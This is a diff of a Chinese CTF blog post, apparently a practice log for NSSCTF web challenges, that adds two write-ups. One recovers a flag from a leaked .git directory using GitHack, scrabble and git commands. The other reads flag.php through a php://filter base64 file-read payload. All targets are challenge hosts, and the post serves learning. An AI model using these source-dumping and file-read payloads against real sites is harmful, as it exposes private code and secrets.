@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-text">[安洵杯 2019]easy_web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF-2018-Easy-Audit"><span class="toc-text">[NCTF 2018]Easy_Audit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FBCTF-2019-rceservice"><span class="toc-text">[FBCTF 2019]rceservice</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-text">法一：换行绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9APCRE%E5%9B%9E%E6%BA%AF"><span class="toc-text">法二：PCRE回溯</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-web"><span class="toc-text">[安洵杯 2019]easy_web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF-2018-Easy-Audit"><span class="toc-text">[NCTF 2018]Easy_Audit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FBCTF-2019-rceservice"><span class="toc-text">[FBCTF 2019]rceservice</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%9A%E6%8D%A2%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-text">法一：换行绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9APCRE%E5%9B%9E%E6%BA%AF"><span class="toc-text">法二：PCRE回溯</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF-2018-%E5%85%A8%E7%90%83%E6%9C%80%E5%A4%A7%E4%BA%A4%E5%8F%8B%E7%BD%91%E7%AB%99"><span class="toc-text">[NCTF 2018]全球最大交友网站</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FSCTF-2023-%E5%B7%B4%E5%B7%B4%E6%89%98%E6%96%AF%EF%BC%81"><span class="toc-text">[FSCTF 2023]巴巴托斯！</span></a></li></ol>
     </div>
   
         
@@ -246,12 +246,12 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #ff7d73">刷题</a>
+                <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #00bcd4">刷题</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/blog/tags/NSS/" style="color: #03a9f4">NSS</a>
+                <a href="/blog/tags/NSS/" style="color: #ff7d73">NSS</a>
             </span>
             
         </span>
@@ -265,7 +265,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">1.6k字</span>
+        <span class="post-count">2.2k字</span>
       </span>
     </span>
 
@@ -274,7 +274,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">8分</span>
+        <span class="post-count">10分</span>
       </span>
     </span>
     
@@ -471,6 +471,72 @@ payload <span class="token operator">=</span> <span class="token string">'&#123;
 res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://node4.anna.nssctf.cn:28398/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
+<hr>
+<h1 id="NCTF-2018-全球最大交友网站"><a href="#NCTF-2018-全球最大交友网站" class="headerlink" title="[NCTF 2018]全球最大交友网站"></a>[NCTF 2018]全球最大交友网站</h1><blockquote>
+<p>git</p>
+</blockquote>
+<p>进入题目，据说原题这里进去是index2.html的时钟，然后结合题目名称指的github，猜测是git泄露</p>
+<p><img src="/blog/2023/11/21/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/image-20231124101847544.png" alt="image-20231124101847544"></p>
+<p>这里用GitHack来dump</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python GitHack.py <span class="token parameter variable">-u</span> http://node4.anna.nssctf.cn:28810/.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>只得到一个README.md</p>
+<pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">Allsource files areingit tag1.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>告诉我们真正的源码内容在tag1.0版本中，那么怎么从泄露的.git目录反提取出1.0的源码？</p>
+<p>这里的git操作和原理要参考p神的一篇文章：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html">https://www.leavesongs.com/PENETRATION/XDCTF-2015-WEB2-WRITEUP.html</a></p>
+<p>而我们可以用工具<a target="_blank" rel="noopener" href="https://github.com/denny0223/scrabble">scrabble</a>来dump当前这个网址<code>/.git/</code>下的文件，nss上的这题貌似源码都在a.zip里面了</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./scrabble http://node4.anna.nssctf.cn:28810/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/21/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/image-20231124104804149.png" alt="image-20231124104804149"></p>
+<p>然后在dump下来的文件夹里用git的命令来查看日志历史</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/21/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/image-20231124105225476.png" alt="image-20231124105225476"></p>
+<p>可以看到有过三次 commit，当前 head 指向 hint 这次 commit</p>
+<p>直接用<code>git show</code>命令显示这次commit提交的详细信息</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> show	<span class="token comment"># 显示最新提交的详细信息</span>
+<span class="token function">git</span> show 6b21737b	<span class="token comment"># 根据哈希显示特定提交的详细信息</span>
+<span class="token function">git</span> show master		<span class="token comment"># 根据分支名称显示特定提交的详细信息</span>
+<span class="token function">git</span> show <span class="token operator">&lt;</span>commit<span class="token operator">></span> <span class="token operator">&lt;</span>filename<span class="token operator">></span>	<span class="token comment"># 显示特定文件的提交详细信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2023/11/21/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/image-20231124105347008.png" alt="image-20231124105347008"></p>
+<p>这里的flag是假的，我们再show上一次hello的commit修改内容</p>
+<p><img src="/blog/2023/11/21/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/image-20231124110020977.png" alt="image-20231124110020977"></p>
+<p>得到真正的flag</p>
+<p>另外的解法：</p>
+<ul>
+<li><p>这里也可以用<code>git reset</code>指令回滚版本来得到flag</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> 02b7f44320ac0ec69e954ab39f627b1e13d1d362<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>得到readme.txt,即flag</p>
+<blockquote>
+<p><code>git reset –-soft</code>：回退到某个版本，只回退了commit的信息，不会恢复到index file一级。如果还要提交，直接commit即可</p>
+</blockquote>
+<blockquote>
+<p><code>git reset -–hard</code>：彻底回退到某个版本，本地的源码也会变为上一个版本的内容，撤销的commit中所包含的更改被冲掉</p>
+</blockquote>
+</li>
+<li><p>也可以用Git_Extract一把梭</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python git_extract.py http://node4.anna.nssctf.cn:28810/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>这个会把每个版本的内容都dump下来，简直是神（</p>
+</li>
+</ul>
+<hr>
+<h1 id="FSCTF-2023-巴巴托斯！"><a href="#FSCTF-2023-巴巴托斯！" class="headerlink" title="[FSCTF 2023]巴巴托斯！"></a>[FSCTF 2023]巴巴托斯！</h1><blockquote>
+<p>http+任意文件读取</p>
+</blockquote>
+<ol>
+<li>Access Denied! I love FSCTF Browser</li>
+<li>Access Denied! Are you local man?</li>
+</ol>
+<p>满足上面这两个条件，然后就能进行任意文件读取了</p>
+<p><img src="/blog/2023/11/21/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953/image-20231124111252315.png" alt="image-20231124111252315"></p>
+<p>flag在flag.php，直接用伪协议读</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">index<span class="token operator">.</span>php<span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=flag.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>base64解码即可</p>
 <hr>
 
     </div>
